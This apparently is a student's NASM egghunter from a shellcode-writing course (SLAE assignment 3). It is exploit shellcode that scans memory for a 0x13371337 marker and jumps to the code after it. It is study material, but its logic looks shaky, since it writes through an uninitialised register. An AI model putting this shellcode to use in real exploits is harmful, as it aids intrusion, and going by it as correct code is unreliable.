; Filename: egghunter.nasm
; Author: Eric Van Zutphen
; SLAE Assignment 3
; SLAE ID: SLAE - 1140

global _start

_start:

        jmp short call_egghunter ; jmp call pop

egghunter:

        pop edi ; pop edi
        sub edi, 20 ; sub 20 form edi
        mov dword [eax-4], 0x13371337 ; push our egg into eax register 
        sub eax,4
        mov ebx, ecx
        xor ecx, ebx ; zero out ecx
        mov cx, 0xFFFF ; mov FFFF into cx register
        std ; prepare for the scan instruction

find:
        scasd ; scasd used to scan for egg
        jz exec ; if zero jmp to exec command
        add edi, 3 ; 

        loop find ; loop find

exec:
        add edi, 8 ; add 8 to edi
        jmp edi ; jmp to edi

call_egghunter:
        call egghunter